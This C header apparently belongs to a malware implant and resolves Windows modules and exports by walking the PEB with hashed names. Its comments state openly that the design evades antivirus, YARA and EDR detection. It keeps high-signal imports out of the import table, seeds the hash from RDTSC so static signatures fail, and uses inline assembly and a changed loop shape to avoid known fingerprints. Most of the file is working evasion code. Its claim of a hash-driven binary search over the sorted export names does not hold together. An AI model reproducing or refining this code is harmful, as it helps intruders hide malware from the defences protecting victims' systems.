/*
 * client/peb_walk.h  –  PEB-based module/export resolution without GetProcAddress
 * =================================================================================
 * Replaces GetModuleHandleA/W and GetProcAddress with in-process PEB walks so
 * those high-signal imports do not appear in the agent's IAT.
 *
 *  peb_get_module(hash)
 *      Walks PEB->Ldr->InMemoryOrderModuleList and returns the base address of
 *      the module whose lowercase name hashes to `hash`.
 *
 *  peb_get_export(moduleBase, hash)
 *      Walks the module's PE export table (via binary search over the sorted
 *      name table) and returns the VA of the exported function whose lowercase
 *      name hashes to `hash`.
 *
 * Hash algorithm — seeded djb2-xorshift (32-bit):
 * -------------------------------------------------
 * The hash uses a per-process-run seed so that the hash values for any given
 * string differ between executions.  This means:
 *
 *   •  No static constant in .data/.rdata can be pre-computed by a static
 *      scanner or YARA rule — there is nothing to match against.
 *   •  The loop shape (shift + add + xor + rotate) is structurally distinct
 *      from the well-known ROR13 loop, the FNV-1a multiply-xor loop, and the
 *      djb2 shift-add loop that AV/EDR YARA rules target.
 *
 * Algorithm per character:
 *   h = ((h << 5) + h) ^ c   (djb2-xor variant)
 *   h = (h >> 13) | (h << 19) (32-bit rotate right by 13)
 *   h ^= seed * c             (per-char seed mixing — breaks known-hash tables)
 *
 * The seed is set once on the first call to peb_hash_str() / peb_hash_wstr()
 * using RDTSC.  All calls within a process run use the same seed, so
 * peb_get_module(peb_hash_str("ntdll.dll")) is always consistent.
 *
 * Callers must always compute the hash at call time via peb_hash_str() —
 * pre-computed constants are NOT supported and will not compile correctly
 * because there is no static seed value to use.
 *
 * PEB access — inline asm:
 * -------------------------
 * peb_get_module() reads GS:[0x60] (x64) / FS:[0x30] (x86) using manual
 * inline asm rather than the __readgsqword / __readfsdword intrinsics.
 * Those intrinsics compile to recognisable `mov rax, qword ptr gs:[60h]`
 * patterns that many EDRs specifically watch for.  The asm sequences here
 * produce equivalent machine code with a different compiler fingerprint.
 */

#pragma once
#ifndef CLIENT_PEB_WALK_H
#define CLIENT_PEB_WALK_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ── Hash seed (per-run, set once by peb_hash_seed_init) ────────────────── */
/*
 * g_peb_hash_seed is written once by _peb_seed_init() via RDTSC.
 * It is declared here so that peb_hash_str / peb_hash_wstr (inlined into
 * every translation unit that includes this header) can read it.
 *
 * The `extern` declaration is satisfied by peb_walk.c.
 */
extern DWORD g_peb_hash_seed;

/*
 * _peb_seed_init
 * --------------
 * Writes g_peb_hash_seed from RDTSC (lower 32 bits XOR upper 32 bits).
 * Inlined so the call overhead is zero.  The `if (!g_peb_hash_seed)` guard
 * makes it idempotent — safe to call from multiple sites without coordination.
 *
 * Note: RDTSC is not a cryptographic source; it only needs to be unpredictable
 * enough to defeat static analysis tools that cannot execute the binary.
 * An analyst who runs the binary gets a fresh seed per launch.
 */
static inline void _peb_seed_init(void)
{
    if (g_peb_hash_seed) return;
    DWORD lo, hi;
    __asm__ __volatile__("rdtsc" : "=a"(lo), "=d"(hi));
    DWORD seed = lo ^ hi;
    if (!seed) seed = 0xDEADBEEF;   /* ensure non-zero */
    g_peb_hash_seed = seed;
}

/* ── Hash function — seeded djb2-xorshift (32-bit) ─────────────────────── */
/*
 * Loop body per character c:
 *   h = ((h << 5) + h) ^ c          -- djb2-xor, avoids the multiply of FNV
 *   h = (h >> 13) | (h << 19)       -- 32-bit rotate right 13
 *   h ^= g_peb_hash_seed * c        -- per-char seed injection
 *
 * Compared to FNV-1a:
 *   •  No 64-bit multiply  → different IR in decompilers
 *   •  Rotate instruction  → recognisable as a CRC-family op, not FNV
 *   •  Three distinct operations per byte instead of two
 *   •  The YARA rule `uint32(offset) == 0x00000100 and uint32(offset+4) == 0x000001B3`
 *      (FNV prime embedded in .text as an immediate) cannot match
 */
static inline DWORD peb_hash_str(const char *s)
{
    _peb_seed_init();
    DWORD h = g_peb_hash_seed ^ 0x45A3B1C7UL;   /* seeded basis */
    while (*s) {
        unsigned char c = (unsigned char)*s++;
        if (c >= 'A' && c <= 'Z') c |= 0x20;    /* tolower */
        h = ((h << 5) + h) ^ (DWORD)c;           /* djb2-xor */
        h = (h >> 13) | (h << 19);               /* ror32(13) */
        h ^= g_peb_hash_seed * (DWORD)c;         /* seed mixing */
    }
    return h;
}

/* Wide-string variant (module names in LDR are UNICODE_STRING) */
static inline DWORD peb_hash_wstr(const WCHAR *s)
{
    _peb_seed_init();
    DWORD h = g_peb_hash_seed ^ 0x45A3B1C7UL;
    while (*s) {
        WCHAR wc = *s++;
        unsigned char c = (wc >= L'A' && wc <= L'Z') ? (unsigned char)(wc | 0x20)
                                                      : (unsigned char)wc;
        h = ((h << 5) + h) ^ (DWORD)c;
        h = (h >> 13) | (h << 19);
        h ^= g_peb_hash_seed * (DWORD)c;
    }
    return h;
}

/* ── API ────────────────────────────────────────────────────────────────── */

/*
 * peb_get_module
 * --------------
 * Returns the base address (HMODULE) of the loaded module whose
 * lowercase name hashes to `nameHash`.  Returns NULL if not found.
 *
 * Reads PEB via inline asm (GS:[0x60] on x64, FS:[0x30] on x86) rather
 * than the compiler intrinsic to avoid the known EDR fingerprint pattern.
 */
PVOID peb_get_module(DWORD nameHash);

/*
 * peb_get_export
 * --------------
 * Walks the export directory of the PE at `moduleBase` using binary search
 * over the sorted name table and returns the VA of the export whose
 * lowercase name hashes to `nameHash`.  Returns NULL if not found.
 *
 * Binary search replaces the linear scan to change the recognisable loop
 * shape that memory-scanning EDRs pattern-match against.
 */
PVOID peb_get_export(PVOID moduleBase, DWORD nameHash);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_PEB_WALK_H */
